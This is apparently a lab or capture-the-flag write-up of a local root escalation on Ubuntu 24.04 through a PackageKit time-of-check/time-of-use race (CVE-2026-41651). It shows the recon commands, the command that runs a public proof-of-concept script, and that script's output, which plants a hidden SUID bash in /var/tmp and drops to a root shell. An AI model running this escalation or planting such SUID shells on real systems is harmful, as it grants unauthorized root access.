# PackageKit Pack2TheRoot (CVE-2026-41651)

## Identify the shell context

The Cohort marimo shell was a non-root user on Ubuntu 24.04.4 LTS with kernel `6.8.0-136-generic`:

```bash
id
uname -a
```

```text
uid=1000(marimo) gid=1000(marimo) groups=1000(marimo)
Linux cohort 6.8.0-136-generic ... x86_64 GNU/Linux
```

## Run the observed PackageKit exploit

The successful trace used the [Pack2TheRoot PoC](https://github.com/0xBlackash/CVE-2026-41651) from a local file. Its output showed a PackageKit D-Bus transaction and a `SIMULATE` to `REAL` time-of-check/time-of-use race on the same transaction:

```bash
python3 CVE-2026-41651.py
```

```text
[+] SUID drop directory: /var/tmp  (no nosuid/noexec)
[+] Package format: DEB
[*] Building test packages...
[+] Dummy pkg:   /tmp/pk-dummy-141685.deb
[+] Payload pkg: /tmp/pk-payload-141685.deb
[+] Payload installs SUID bash to: /var/tmp/.suid_bash
[*] Connecting to system D-Bus...
[*] Creating PackageKit transaction...
[*] Firing TOCTOU race (SIMULATE -> REAL on same transaction)...
[+] Confirmed: /var/tmp/.suid_bash is SUID root (mode=0o104755)
[+] Dropping to root shell via SUID bash (-p preserves effective UID=0)
.suid_bash-5.2#
```

The trace confirmed root shell access.
